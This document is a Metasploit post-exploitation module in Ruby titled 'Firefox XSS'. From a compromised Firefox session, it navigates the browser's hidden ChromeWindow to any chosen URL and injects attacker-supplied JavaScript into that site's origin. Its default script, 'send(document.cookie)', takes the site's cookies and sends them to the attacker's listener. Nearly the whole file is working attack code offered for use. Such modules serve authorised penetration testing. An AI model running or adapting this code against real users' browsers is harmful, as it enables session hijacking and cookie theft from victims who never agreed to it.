##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'json'
require 'msf/core/payload/firefox'

class Metasploit3 < Msf::Post

  include Msf::Payload::Firefox

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox XSS',
      'Description'   => %q{
        This module runs the provided SCRIPT as javascript in the
        origin of the provided URL. It works by navigating a hidden
        ChromeWindow to the URL, then injecting the SCRIPT with Function.
        The callback "send(result)" is used to send data back to the listener.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'Platform'      => [ 'firefox' ]
    ))

    register_options([
      OptString.new('SCRIPT', [true, "The javascript command to run", 'send(document.cookie)']),
      OptPath.new('SCRIPTFILE', [false, "The javascript file to run"]),
      OptString.new('URL', [
        true, "URL to inject into", 'http://metasploit.com'
      ]),
      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
    ], self.class)
  end

  def run
    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])

    if results.present?
      print_good results
    else
      print_error "No response received"
    end
  end

  def js_payload
    js = datastore['SCRIPT'].strip
    %Q|

      (function(send){
        #{set_timeout_source}

        var hiddenWindow = Components.classes["@mozilla.org/appshell/appShellService;1"]
                               .getService(Components.interfaces.nsIAppShellService)
                               .hiddenDOMWindow;

        hiddenWindow.location = 'about:blank';
        var src = (#{JSON.unparse({ :src => js })}).src;
        var key = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";

        hiddenWindow[key] = true;
        hiddenWindow.location = "#{datastore['URL']}";

        var evt = function() {
          if (hiddenWindow[key]) {
            setTimeout(evt, 200);
          } else {
            setTimeout(function(){
              try {
                send(hiddenWindow.wrappedJSObject.Function('send', src)(send));
              } catch (e) {
                send("Error: "+e.message);
              }
            }, 500);
          }
        };

        setTimeout(evt, 200);
      })(send);

    |.strip
  end
end
